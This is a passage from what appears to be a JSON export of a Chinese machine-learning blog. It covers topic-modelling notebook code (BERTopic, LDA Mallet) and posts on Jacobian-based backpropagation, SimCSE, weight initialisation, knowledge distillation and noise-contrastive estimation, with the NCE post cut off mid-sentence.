if i == -1: return 'outlier' tpc = model.get_topic(i)[:8] words = [x[0] for x in tpc] tw = ' '.join(words) return twtopic_df['keywords'] = topic_df['Topic'].apply(get_keywords)topic_df 1model.get_topic(0) 1model.visualize_topics() 1# model.visualize_distribution(probs) Classic LDA id1import os 1!pip install -Uqq gensim==3.8.3 123456# import os #importing os to set environment variable# def install_java():# !apt-get install -y openjdk-8-jdk-headless -qq &gt; /dev/null #install openjdk# os.environ[\"JAVA_HOME\"] = \"/usr/lib/jvm/java-8-openjdk-amd64\" #set environment variable# !java -version #check java version# install_java() 12!wget -q http://mallet.cs.umass.edu/dist/mallet-2.0.8.zip!unzip -qq mallet-2.0.8.zip 12os.environ['MALLET_HOME'] = '/content/mallet-2.0.8'mallet_path = '/content/mallet-2.0.8/bin/mallet' # you should NOT need to change this 12345678910111213141516import gensimimport gensim.corpora as corporafrom gensim.utils import simple_preprocessfrom gensim.models.wrappers import LdaMalletfrom gensim.models.coherencemodel import CoherenceModelfrom gensim import similaritiesimport os.pathimport reimport globimport nltknltk.download('stopwords')from nltk.tokenize import RegexpTokenizerfrom nltk.corpus import stopwords 1234567891011121314151617181920212223242526272829303132333435def preprocess_data(doc_set,extra_stopwords = &#123;&#125;): # adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python # replace all newlines or multiple sequences of spaces with a standard space doc_set = [re.sub('\\s+', ' ', doc) for doc in doc_set] # initialize regex tokenizer tokenizer = RegexpTokenizer(r'\\w+') # create English stop words list en_stop = set(stopwords.words('english')) # add any extra stopwords if (len(extra_stopwords) &gt; 0): en_stop = en_stop.union(extra_stopwords) # list for tokenized documents in loop texts = [] # loop through document list for i in doc_set: # clean and tokenize document string raw = i.lower() tokens = tokenizer.tokenize(raw) # remove stop words from tokens stopped_tokens = [i for i in tokens if not i in en_stop] # add tokens to list texts.append(stopped_tokens) return textsdef prepare_corpus(doc_clean): # adapted from https://www.datacamp.com/community/tutorials/discovering-hidden-topics-python # Creating the term dictionary of our courpus, where every unique term is assigned an index. dictionary = corpora.Dictionary(doc_clean) dictionary = corpora.Dictionary(doc_clean) dictionary.filter_extremes(no_below=5, no_above=0.5) # Converting list of documents (corpus) into Document Term Matrix using dictionary prepared above. doc_term_matrix = [dictionary.doc2bow(doc) for doc in doc_clean] # generate LDA model return dictionary,doc_term_matrix 12doc_clean = preprocess_data(texts,&#123;&#125;)dictionary, doc_term_matrix = prepare_corpus(doc_clean) 12number_of_topics=30 # adjust this to alter the number of topicswords=10 #adjust this to alter the number of words output for the topic below 1ldamallet = LdaMallet(mallet_path, corpus=doc_term_matrix, num_topics=number_of_topics, id2word=dictionary, alpha=10) 123456789# topic_words = ldamallet.show_topics(num_topics=number_of_topics,num_words=5)# topic_words = [x[1] for x in topic_words]topic_words = []for i in range(number_of_topics): tpc = ldamallet.show_topic(i, topn=7, num_words=None) words = [x[0] for x in tpc] tw = ' '.join([str(i) + ':'] + words) topic_words.append(tw) 1topic_words 123456789101112# show resulttopics_docs = list()for m in ldamallet[doc_term_matrix[:1000]]: topics_docs.append(m)x = np.array(topics_docs[:1000])y = np.delete(x,0,axis=2)y = y.squeeze()best_topics = np.argmax(y, axis=1) # 结果是一个分布topics = list(best_topics)topics = [topic_words[x] for x in topics] 1234567891011121314151617181920212223clrs = random.sample(Turbo256, number_of_topics)color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=topics))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), ('desc', '@desc'), ('topic', '@topic')])p = figure(plot_width=1200, plot_height=600, tools=[hover], title=\"Test\")p.circle('x', 'y', size=10, source=source, fill_color=transform('topic', color_map), # legend='topic')# p.legend.location = \"top_left\"# p.legend.click_policy=\"hide\"bpl.show(p) 看上面的图表，由LDA重新识别的主题内文档不一定相互接近。 与BERTopic是互补的，可以得到不同的主题表示。 Bertopic在短文本这类可能只有一个主题的文本中表现较好，而LDA可以更好地处理主题组合较多的文本。 两者可以互补，因此尝试两者都有意义。 这和两者的原理是相关的，Bertopic是空间距离的聚类，LDA是统计层面的共现规律分析。 12# pyLDAvis可视化!pip install -Uqq pyLDAvis==2.1.2 1gensimmodel = gensim.models.wrappers.ldamallet.malletmodel2ldamodel(ldamallet) 123456import pyLDAvisimport pyLDAvis.gensimpyLDAvis.enable_notebook()p = pyLDAvis.gensim.prepare(gensimmodel, doc_term_matrix, dictionary)p ref: https://skok.ai/2021/05/27/Topic-Models-Introduction.html BERTopic 详解 BERTopic，利用BERT嵌入和c-TF-IDF来创建密集的集群，使话题易于解释，同时在话题描述中保留重要词汇。其核心步骤主要是做三件事： 用基于BERT的Sentence Transformers提取语句嵌入 通过UMAP和HDBSCAN，将文档嵌入进行聚类，语义相近的语句将聚集成簇群 用c-TF-IDF提取主题词 c-TF-IDF就是将一个主题下的所有文档连接在一起成为一个文档，在主题间计算TF-IDF的方法。 12345678910111213import numpy as npimport pandas as pdimport jiebaimport umapimport hdbscanfrom sentence_transformers import SentenceTransformerfrom sklearn.feature_extraction.text import CountVectorizerfrom sklearn.metrics.pairwise import cosine_similarityfrom tqdm import tqdmimport matplotlib.pyplot as plt# import sys# sys.setrecursionlimit(1000000) 1234567891011121314151617181920212223242526272829303132333435363738394041424344# model = SentenceTransformer(r'my_pretrained_chinese_embeddings')# embeddings = model.encode(data['review'].tolist(), show_progress_bar=True)#### 降维umap_embeddings = umap.UMAP( n_neighbors=25, n_components=10, min_dist=0.00, metric='cosine', random_state=2020).fit_transform(embeddings)#### 聚类# 使用HDBSCAN来寻找高密簇cluster = hdbscan.HDBSCAN( min_cluster_size=30, metric='euclidean', cluster_selection_method='eom', prediction_data=True).fit(umap_embeddings)#### c-TF-IDFdef c_tf_idf(documents, m, ngram_range=(1, 1)): my_stopwords = [i.strip() for i in open('stop_words_zh.txt',encoding='utf-8').readlines()] count = CountVectorizer( ngram_range=ngram_range, stop_words= my_stopwords).fit(documents) t = count.transform(documents).toarray() w = t.sum(axis=1) tf = np.divide(t.T, w) sum_t = t.sum(axis=0) idf = np.log(np.divide(m, sum_t)).reshape(-1, 1) tf_idf = np.multiply(tf, idf) return tf_idf, count#### 主题归并# 通过比较主题之间的c-TF-IDF向量，合并最相似的向量，最后重新计算c-TF-IDF向量来更新主题的表示","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"topic model","slug":"topic-model","permalink":"https://racleray.github.io/tags/topic-model/"}]},{"title":"Jacobi BP整理","slug":"Jacobi-BP整理","date":"2021-06-18T13:54:30.000Z","updated":"2023-08-07T11:54:31.030Z","comments":true,"path":"posts/ff0063e5.html","link":"","permalink":"https://racleray.github.io/posts/ff0063e5.html","excerpt":"从Jabobi Matrix角度，梳理神经网络反向传播过程。","text":"1 方向导数 在自变量空间的某个位置\\(w\\)处，选择一个方向\\(d\\)（单位向量），在该方向的倒数为： \\[ \\nabla_df(\\mathbf{w})=\\lim_{\\alpha \\to 0}\\frac{f(\\mathbf{w}+\\alpha \\mathbf{d}) - f(\\mathbf{w})}{\\alpha} \\] \\(\\alpha\\)趋于0时，\\(\\alpha \\mathbf{d}\\)也趋于0，平均变化率变为瞬时变化率，即导数数。 \\[ \\nabla_df(\\mathbf{w})=\\lim_{\\alpha \\mathbf{d} \\to 0}\\frac{f(\\mathbf{w}+\\alpha \\mathbf{d}) - f(\\mathbf{w})}{\\alpha \\mathbf{d}} \\] 方向导数就是多元函数在某位置，沿着某方向的瞬时变化率。 优化目标函数（最小化为例），就是要找到方向导数为负数且最小的方向，函数值在此方向下降最快。 下面就是使用梯度，快速找到方向导数为负数且最小的方向。 多元函数，分别优化每一个元，每个变量单独分析其偏导数。因为运动方向可以分解为多个分量的和。偏导数形式下的多元函数的函数值变化写成（二元为例）： \\[ \\Delta f=\\frac{\\partial f}{\\partial w_1}\\Delta w_1 + \\frac{\\partial f}{\\partial w_2}\\Delta w_2 \\] 运动的距离（二维）变为： \\[ \\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2} \\] 那么，函数值在运动方向上的偏导数就是： \\[ \\frac {\\frac{\\partial f}{\\partial w_1}\\Delta w_1 + \\frac{\\partial f}{\\partial w_2}\\Delta w_2}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} = \\begin{pmatrix} \\frac{\\partial f}{\\partial w_1}, \\frac{\\partial f}{\\partial w_2} \\end{pmatrix} \\begin{pmatrix} \\frac{\\Delta w_1}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} \\\\ \\frac{\\Delta w_2}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} \\end{pmatrix} \\] 其中第一个向量就是函数在\\(\\mathbf{w}\\)处的梯度，第二个向量就是\\(\\Delta \\mathbf{w}\\)的变化方向上的单位向量。 所以，多元函数的方向导数，就是该位置梯度与自变量变化方向向量的内积。也即，梯度向量在自变量变化方向向量上的投影。 那么，最优的最小化方向为，\\(cos(\\theta)\\)为-1的自变量变化方向。即自变量变化为负梯度方向。 垂直于梯度方向时，函数值不变化。 当然梯度下降，需要设置一个较小的学习率，因为，梯度反映的是函数瞬时的变化率，只保证在当前位置的较小领域内的变化规律。 2 Jacobi 有n维向量 \\(\\mathbf{w}\\)，经过一层网络，得到 m 维 \\(f(\\mathbf w)\\)。 \\[ \\mathbf f(\\mathbf w)=\\begin{pmatrix} f_1(\\mathbf w) \\\\ f_2(\\mathbf w) \\\\ ... \\\\ f_m(\\mathbf w) \\end{pmatrix} \\] 每一维为一个标量函数，可以对 n维向量 \\(\\mathbf{w}\\)进行求偏导操作，求得梯度。得到 \\[ \\begin{bmatrix} \\frac{\\partial f_1}{\\partial w_1} &amp; ... &amp; \\frac{\\partial f_1}{\\partial w_n} \\\\ ... &amp; ... &amp; ... \\\\ \\frac{\\partial f_m}{\\partial w_1} &amp; ... &amp; \\frac{\\partial f_m}{\\partial w_n} \\end{bmatrix} \\] 这就是函数在 \\(\\mathbf{w}\\) 处的Jacobi matrix。每一行是 \\(\\mathbf f(\\mathbf w)\\)的分量在\\(\\mathbf{w}\\) 处的梯度向量。 线性近似（理解为函数在某一位置处的一阶泰勒展开并忽略高阶无穷小）的误差，是自变量变化值趋于0时，相对自变量变化值的高阶无穷小。也就是说，线性近似是用一个高阶的函数来近似低阶的原函数，而其误差可以趋于无穷小。 在多元函数中，近似关系可写为： \\[ \\mathbf f(\\mathbf w) \\approx \\mathbf f(\\mathbf w^*) + \\mathbf J_f(\\mathbf w) \\cdot (\\mathbf w - \\mathbf w^*) \\] Jacobi matrix每一行是原函数一个分量的梯度，每一维分量的近似组合成了对原函数整体的近似。 3 Back propagation with Jacobi 计算图中，一对父子节点就是一个多对多的映射，都可以求一个Jacobi matrix。 在chain rule之下，一个复合映射的Jacobi是容易求的。 \\[ f(g(h(\\mathbf w))) \\] 其Jacobi表示为 \\(\\mathbf J_f(g(h(\\mathbf w))) \\cdot \\mathbf J_g(h(\\mathbf w)) \\cdot \\mathbf J_h(\\mathbf w)\\)。其中输入输出维度是相对应的。 计算图中，每个节点将结果通过，对自己的Jacobi（单位矩阵）乘上对父节点的Jacobi，将信息传递给上一层。 那么最终结果对一个节点的Jacobi，可以计算： \\[ \\mathbf J_f = \\sum_s \\mathbf J_{rs} \\mathbf J_{sf} \\] \\(\\mathbf J_{rs}\\)是最终结果对s节点的Jacobi（表示累计误差BP到s的梯度），\\(\\mathbf J_{sf}\\)是节点s对f节点的Jacobi。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class Node(object): \"\"\" 计算图节点基类 \"\"\" def __init__(self, *parents, **kargs): self.kargs = kargs self.graph = kargs.get('graph', default_graph) self.need_save = kargs.get('need_save', True) self.parents = list(parents) # 父节点列表 self.children = [] # 子节点列表 self.value = None # 本节点的值 self.jacobi = None # 结果节点对本节点的雅可比矩阵 # 将本节点添加到父节点的子节点列表中 for parent in self.parents: parent.children.append(self) # 将本节点添加到计算图中 self.graph.add_node(self) ... def forward(self): \"\"\" 前向传播计算本节点的值，若父节点的值未被计算，则递归调用父节点的forward方法 \"\"\" for node in self.parents: if node.value is None: node.forward() self.compute() def backward(self, result): \"\"\" 反向传播，计算结果节点对本节点的雅可比矩阵 \"\"\" if self.jacobi is None: if self is result: # 对自己的Jacobi # self.dimension()表示节点值向量的维度 self.jacobi = np.mat(np.eye(self.dimension())) else: self.jacobi = np.mat( np.zeros((result.dimension(), self.dimension()))) for child in self.get_children(): if child.value is not None: # 为None时，表示不在当前计算路径上 # 即为上文中的计算公式 10 self.jacobi += child.backward(result) * child.get_jacobi(self) return self.jacobi def dimension(self): \"\"\" 返回本节点的值展平成向量后的维数 \"\"\" return self.value.shape[0] * self.value.shape[1] ... 调用结果节点forworad，得到所有value属性，缓存在每个节点。调用某个节点backworad，将计算该节点的梯度保存在jacobi属性（梯度的转置，若规定梯度为列向量）中。 同时，实现Jacobi的乘法关系下的计算，可以进行推导。过程比较繁琐但是不难，直接写结果了： 矩阵 \\(\\mathbf C=\\mathbf A \\mathbf B\\)，A为(m,n)维，B为(n,k)维。将三个矩阵全部展开，拼接为一个列向量。 那么C对A的Jacobi为（mk, mn） \\[ \\begin{bmatrix} B^T &amp; 0 &amp; ... &amp; 0 \\\\ 0 &amp; B^T &amp; ... &amp; 0 \\\\ ... &amp; ... &amp; ... &amp; ... \\\\ 0 &amp; 0 &amp; ... &amp; B^T \\end{bmatrix} \\] C对B的Jacobi为（mk, nk）的 \\[ \\begin{bmatrix} diagonal(a_{1,1}) &amp; diagonal(a_{1,2}) &amp; ... &amp; diagonal(a_{1,n}) \\\\ diagonal(a_{2,1}) &amp; diagonal(a_{2,2}) &amp; ... &amp; diagonal(a_{2,n}) \\\\ ... &amp; ... &amp; ... &amp; ... \\\\ diagonal(a_{m,1}) &amp; diagonal(a_{m,2}) &amp; ... &amp; diagonal(a_{m,n}) \\end{bmatrix} \\] 到此，基于Jacobi的BP计算方式，就基本没有问题了。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"BP","slug":"BP","permalink":"https://racleray.github.io/tags/BP/"},{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"}]},{"title":"SimCSE-文本对比学习","slug":"SimCSE-文本对比学习","date":"2021-06-15T13:27:06.000Z","updated":"2023-08-07T11:54:31.034Z","comments":true,"path":"posts/9e098b96.html","link":"","permalink":"https://racleray.github.io/posts/9e098b96.html","excerpt":"","text":"文本对比学习不同于图像的一点，就是增广方式。文本随机删除、乱序、替换，好像都可以，但是有没有道理，效果能有多大提升，都不那么清楚。这方面也没有比较公认处理方法流程。 论文 SimCSE (Git)，提出一种简单的对比学习方法，直接在BERT类模型之上，使用设计的对比学习损失进行fine tune，取得了比较好的效果。 方法 首先在图像领域使用的对比学习损失公式是 本文提出的方法，不使用文本增广生成对比样本，而是通过随机Dropout模型的intermediate representations，得到一组不同mask下的对比学习样例，作为正样本。而不是来自同一个原文本的 intermediate representations 组成多组负样本。 两个绿圈正是不同dropout下的一组正样本。思路确实挺简单的，但是别人做出来了，还整理得有条理。唉，我又搞得了什么鬼贡献呢。 论文结果，在取0.1 dropout rate时，无监督句子向量的效果最好。STS-B任务的Spearman`s correlation 达到 79.1。 论文还在有监督条件下，进程了实验。在NLI数据集上，加入两个源文本 同义(entailment)、中立(neutral)、反义(contradiction) 三种情况的监督信息。 正例来自同义的句子对，负例来自不同含义的句子。同时使用严格反义的句子对作为负例时，效果会有提升。 这里没有使用不同dropout，毕竟已经有正负样本标签了。作者也做了实验，使用dropout增广并没有带来提升。 对比学习效果评价 在看Bert Flow时，了解到向量表示的各向异性很重要，尤其在语义相似性任务中，对相似性指标影响很大。另外，直觉来讲，对比学习目的就是将同类相似的聚在一起，同时将向量分布尽量保持均匀，以保留更可能多的信息。 好的学习效果，应该保证 结果的对齐性和均匀性(Alignment and uniformity)。原论文推导较多，结论就是，对比学习的损失，可以转换为对齐损失和均匀损失之和。过程挺复杂的，这里并不关心(挺麻烦的)。 论文给出了代码： 注意，以上计算中的x和y都是经过 L2 normalize 的向量。 原论文做了很多实验，发现要同时将对齐损失和均匀损失达到最优，很难，至少在作者的实验中，是达不到的。 SimCSE中，将这两个损失，作为metrics使用，评价sentence embedding的对比学习效果。两个指标，都是尽量小更好，但是很难保证同时最优。 经验 无监督句向量训练，只使用随机Dropout，得到两个representations 作为正例，比在源文本上进行随机删除替换等操作的效果更好。 有监督条件下，不需要随机Dropout生成样本表达，利用监督信息就能得到很好的学习效果。 训练BERT base时，使用256或者512 batch size效果相对较好。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"SimCSE","slug":"SimCSE","permalink":"https://racleray.github.io/tags/SimCSE/"}]},{"title":"回顾神经网络初始化方法","slug":"回顾神经网络初始化方法","date":"2021-06-14T15:51:41.000Z","updated":"2023-08-07T11:54:31.040Z","comments":true,"path":"posts/1498e8ac.html","link":"","permalink":"https://racleray.github.io/posts/1498e8ac.html","excerpt":"","text":"那么首先我们已经知道，全0或者常数、过大、过小的权重初始化都有梯度消失或者梯度爆炸的问题。而我们所期望的初始化状态是：期望为0，方差在一定范围内，同时尽量保证不同层的权重方差的一致性。这样出现internal covariance shift的可能性会大幅降低。闲来无事，适巧康康。 为了更简洁的期望与方差 首先需要知道期望\\(E\\)和方差\\(Var\\)的计算方法，基本公式： \\[ Var(X)=E(X^2)-(E(X))^2 \\] \\[ Covariance(X,Y)=E((X-E(X))(Y-E(Y)))\\\\ =E(XY)-E(X)E(Y) \\] 当X，Y为独立的随机变量，Corvariance(即Cov)为0。 可以表示出两个独立随机变量的和的方差： \\[ Var(X+Y)=E((X+Y)^2)-(E(X+Y))^2\\\\ =E(X^2+Y^2+2XY)-(E(X)+E(Y))^2\\\\ =E(X^2)-(E(X))^2+E(Y^2)-(E(Y))^2\\\\ =Var(X)+Var(Y) \\] 两个独立随机变量的积的方差： \\[ Var(XY)=E((XY)^2)-(E(XY))^2\\\\ =E(X^2)E(Y^2)-(E(X)E(Y))^2\\\\ =(Var(X)+E(X)^2)(Var(Y)+E(Y)^2)-(E(X)E(Y))^2\\\\ =Var(X)Var(Y)+E(X)^2Var(Y)+Var(X)E(Y)^2 \\] 神经网络计算过程一般性表达 基本的计算方式： \\[ Z_l=WA_{l-1}+B\\\\ A_l=f(Z_l) \\] W与A是相互独立的。每一层不同神经元的权重\\(w_i\\)是独立同分布的。 假如W与A的分布已知，那么Z的方差可以计算： \\[ Var(z)=Var(\\sum_{i}^{fan\\_in} w_ia_i)\\\\ =fan\\_in \\times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2) \\] fan_in表示输入单元个数，每个输入单元的激活值与对应的权重相乘求和，得到当前层的激活值。独立同分布，所以和的方差可以简化为方差之和。 不同激活函数的影响 初始化的目的始终是避免梯度爆炸或者消失，最好可以加快收敛速度。那么在分析整个网络的参数逐层变化时，需要分析一般性的变化规律。 激活值的分布，受到激活函数的形式影响，这是一个关键的因素。 对称型激活函数 tanh，sigmoid等关于x轴对称的函数，可以保证激活值的期望也为0。而此时，方差的计算得到简化： \\[ Var(Z_l)=fan\\_in^{l} \\times \\prod_{l=1}^{L}Var(w_l) \\times Var(Z_{l-1}) \\] 同时考虑反向传播的过程，其差异在于fan_in 变为 fan_out，详细过程见论文。同时约束前向和反向的系数都为1，那么，可以假设权重的分布为 \\[ N(0, \\frac{2}{fan\\_in+fan\\_out}) \\] 若为均匀分布，可以假设 \\[ U(-\\frac{\\sqrt{6}}{fan\\_in+fan\\_out}, \\frac{\\sqrt{6}}{fan\\_in+fan\\_out}) \\] 非对称分段激活函数 ReLU这类激活函数，激活值的期望不再为0，公式(6)可以进行另一种变换。注意w的期望依然是我们所假设的0，这和激活值的分布是独立的。 \\[ Var(z) =fan\\_in \\times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2)\\\\ =fan\\_in \\times (Var(w)Var(a)+Var(w)E(a)^2)\\\\ =fan\\_in \\times (Var(w)[E(a^2)-E(a)^2]+Var(w)E(a)^2)\\\\ =fan\\_in \\times Var(w) \\times E(a^2) \\] 何凯明推出： \\[ Var(Z_l)=\\frac{1}{2} \\times fan\\_in \\times Var(w_l) \\times Var(Z_{l-1}) \\] 假设两层之间系数为1，权重可假设为分布： \\[ N(0, \\frac{2}{fan\\_in}) \\] 如果按照反向传播计算： \\[ N(0, \\frac{2}{fan\\_out}) \\] 在caffe的实现中，可以选择使用 \\[ N(0, \\frac{4}{fan\\_in + fan\\_out}) \\] 当然也可以不从激活函数入手，使用Normalization方法，强制变换分布。 来自神经网络训练动力学研究的一点点总结 神经网络学习过程，可以从信号频域角度分析。神经网络擅长并且优先学习低频信号信息，而不擅长学习高频振荡信号。也因此，通常模型的参数学习结果是一个比较平滑的曲面（该研究主要是在浅层网络上实验）。论文中说，如无必要，勿增频率。 报告中还展示了一种设计思路，以提高网络处理高频信号的能力，就是scale到较低的值域，以获得相对较小的参数空间。 而参数的初始化，不仅对参数的频率信息有影响，还影响着模型在不同条件下的收敛速度和收敛性（报告展示了浅层网络在MNIST实验的结果）。 实验也指出了多种常用初始化在该理论中，都具有较好的性能。这里的变量和公式，比较复杂，这里也只关心了结论。 凝聚机制 大模型训练后期，参数会偏向简化参数空间，向更少的方向聚集参数梯度向量，出现趋向相同方向的权重。 所以论文的结论为，神经网络存在这小网络偏好，如无必要，勿增神经元。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"initialization","slug":"initialization","permalink":"https://racleray.github.io/tags/initialization/"}]},{"title":"Knowledge Distillation Note","slug":"Knowledge-Distillation-Note","date":"2021-04-18T15:39:09.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/62f6fe86.html","link":"","permalink":"https://racleray.github.io/posts/62f6fe86.html","excerpt":"","text":"知识蒸馏模型采用类似迁移学习的方法，通过采用预先训练好的老师模型(Teacher model）的输出作为监督信号去训练另外一个简单的学生模型(Student model)。 所谓的知识就是从输入向量引至输出向量的节点图。 大概分为三类：知识蒸馏（模型压缩），跨域迁移无标签转换，集成蒸馏。 此处关注知识蒸馏（模型压缩）这一类。 First Step 原文， 综述 1、训练复杂的教师模型（teacher model）：先用硬目标（hard target），也就是正常的标签（label）训练大模型。 2、计算软目标（soft target）：利用训练好的大模型来计算软目标（soft target），也就是大模型预测后再经过softmax层的输出。 3、训练小模型，在小模型的基础上再加一个额外的软目标（soft target）的损失函数，通过权重参数来调节两个损失函数的比重。 4、预测时，将训练好的小模型来进行实验。 软目标（soft target），尽量提高复杂模型里的信息量，也就是熵。 离散的数据在等概的情况下熵值是最大的，在分类的过程中，要尽量贴近与等概率的情况，这样就可以使得软目标（soft target）在每次训练的过程中获得更多的信息和更小的梯度方差，小模型可以用更少的数据和更小的学习率来进行训练，进一步压缩。 方法分类： 模型传递训练集成算法：训练学生模型，使其参数和教师模型一样，而不是压缩模型。如图，从教师训练学生1，以此由学生i训练学生i+1，最后集成所有的学生模型。 交替式训练模型算法：采用多个网络同时进行训练，每个网络在训练过程中不仅接受来自真值标记的监督，还参考同伴网络的学习经验来进一步提升泛化能力。在整个过程中，两个网络之间不断分享学习经验，实现互相学习共同进步。两个网络的优化是迭代进行的，直到收敛。 特征表示训练：使用回归模块来配准部分学生网络和部分教师网络的输出特征，并且对输出特征进行处理，可以将网络处理的重点放在得到相似的特征层。 自注意力蒸馏算法：Self Attention Distillation，称为SAD。对于多通道的主力意图有三种方法：1.绝对值求和；2.绝对值指数求和，指数大于1；3.绝对值指数求最大值。让浅层特征来学习高层特征的表达，从而加强网络的整体特征表达能力。这种底层特征模仿高层特征的学习过程，属于自注意力蒸馏(Self Attention Distillation)。 此处更关注特征表示训练这一类。NLP中用的最多的一些方法也来自这一类。比如：DistilBERT学习最后一层的表示。PKDBERT（Patient Knowledge Distillation）同时学习中间层的表示。TinyBERT将embedding层也纳入学习的范畴。同时关注新的基于对比学习的方法。 Contrastive Representation Distillation 论文， Git 基本假设，知识蒸馏应该要迁移的是表征representation，而不是概率分布（不管是使用KL散度还是L2距离）。同时之前的不是基于对比学习的方法，会丢失Teacher模型输出表征representation的结构信息，即忽略了维度间有很复杂的依赖关系。 因为KL散度或者L2距离计算将每个维度认为是独立的，在表征学习中，很难保证这里的独立假设是完成成立的。 符号定义： 这里 \\(Z^T=W_T(T), Z^S=W_S(S)\\), \\(\\sigma\\) 为 softmax 函数。 损失函数： 两个H表示不同的函数，第一个表示交叉熵（标签），第二个表示KL散度（表征）。 对比学习引入 S和T的输入是相同的时，表征应该相似。S和T的输入是不同的时，表征应该不同。 同时衡量表征差异的方法，变为NCE，从而引入的负例，即 对比学习的目标函数为： 如果只是使用该方法，那到此已经可以用了。 目标函数推导 假设，S和T的输入是相同时，C=1(T, S同分布)，否则C=0(T, S不同分布)。有1个相关输入对，N个无关输入对，M为数据集的大小。 计算\\(q(C=1|T,S)\\): 取对数，同时乘上-1： 交换 log(N) 项，两边按p(T,S)求积分： 定义： 引入NCE，不等式右边写成： 设 \\(h^*(T, S)=q(C=1|T,S), h^*=argmax\\ L_{critic}(h)\\) 由于 \\(h^*\\) 是极大值点，所以，一般性的 \\(h\\) 都有下式成立: 其中h为： 所以方法就是先找到 T和S 表征的互信息的上界，然后，优化student模型，使得互信息关于S的下界最大，得到最优的学生模型。 Softmax Regression Representation Distillation 论文，Git 方法基本如图所示，就是设计了三种损失相加。 works slightly better than the cross-entropy loss. 相对而言，没有设计对比学习，但是论文实验结果还是不错的，相比上一节CRD方法，简单不少，但是效果也不错。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Distillation","slug":"Notes/Distillation","permalink":"https://racleray.github.io/categories/Notes/Distillation/"}],"tags":[{"name":"knowledge distillation","slug":"knowledge-distillation","permalink":"https://racleray.github.io/tags/knowledge-distillation/"},{"name":"CRD","slug":"CRD","permalink":"https://racleray.github.io/tags/CRD/"},{"name":"SRRD","slug":"SRRD","permalink":"https://racleray.github.io/tags/SRRD/"}]},{"title":"再看NCE","slug":"再看NCE","date":"2021-04-08T15:41:42.000Z","updated":"2023-08-07T11:54:31.039Z","comments":true,"path":"posts/68340e67.html","link":"","permalink":"https://racleray.github.io/posts/68340e67.html","excerpt":"","text":"概率语言模型，如最大熵模型和概率神经模型，在参数估计时，都有计算量大的问题，词汇表实在是太大了。这让配分函数的计算量大得就想优化它。 只看NCE和Negative Sampling（以下简写为NS），就不说其他的方法了。 NCE和NS刚接触时，看着好像一样一样的。再看，还真是大意了，不够严谨。（废话真多） 标准开头 假设以下是一个模型，根据上下文 \\(c\\) 预测词表 \\(V\\) 中的词 \\(w\\)。 \\[ p_{\\theta}(w \\mid c)=\\frac{u_{\\theta}(w, c)}{\\sum_{w^{\\prime} \\in V} u_{\\theta}\\left(w^{\\prime}, c\\right)}=\\frac{u_{\\theta}(w, c)}{Z_{\\theta}(c)} \\] 假设 \\(u_\\theta = \\exp(s_\\theta(w, c))\\)，\\(Z_\\theta(c)\\)自然是配分函数。\\(s_\\theta\\) 假设是一个可微的函数。 如果了解概率图模型，应该见过使用 Importance Sampling + MC 的方式近似配分函数的期望的法子。NCE走得就是这条路，只是稍稍改进了些。 其他定义： 经验分布表示为 \\(\\hat{p}(w|c)\\) 和 \\(\\hat{p}(c)\\) 模型表示的分布\\(p_\\theta(w|c)\\) NCE的目的就是通过一个 噪声分布 \\(q(w)\\) （w的均匀分布，也可以是对每个概率取幂0&lt; α &lt;1和再normalize得到），得到配分函数的渐进无偏估计。 NCE 方法：通过建立二分类模型，区分来自经验分布（训练数据）和噪声分布的数据，得到最优的模型参数，就是需要的参数求解结果。 数据生成 Label d = ｛0，1｝，表示数据属于噪声或者真实数据。分布表示为： \\[ p(d, w \\mid c)=\\left\\{\\begin{array}{ll} \\frac{k}{1+k} \\times q(w) &amp; \\text { if } d=0 \\\\ \\frac{1}{1+k} \\times \\tilde{p}(w \\mid c) &amp; \\text { if } d=1 \\end{array}\\right. \\] 转换成 d 关于 c 和 w 的条件分布（定义直接推导）： \\[ \\begin{aligned} p(d=0 \\mid c, w) &amp;=\\frac{\\frac{k}{1+k} \\times q(w)}{\\frac{1}{1+k} \\times \\tilde{p}(w \\mid c)+\\frac{k}{1+k} \\times q(w)} \\\\ &amp;=\\frac{k \\times q(w)}{\\tilde{p}(w \\mid c)+k \\times q(w)} \\\\ p(d=1 \\mid c, w) &amp;=\\frac{\\tilde{p}(w \\mid c)}{\\tilde{p}(w \\mid c)+k \\times q(w)} \\end{aligned} \\] 以上是构建的\"proxy corpus\"代理的训练数据分布，那么把模型拟合的分布\\(p_\\theta(w|c)\\)带入，替换掉经验分布 \\(\\hat{p}(w|c)\\)，就可以得到一个可以操作的目标。 方法 但是，\\(\\hat{p}(w|c)\\)还是有 \\(Z_\\theta(c)\\) 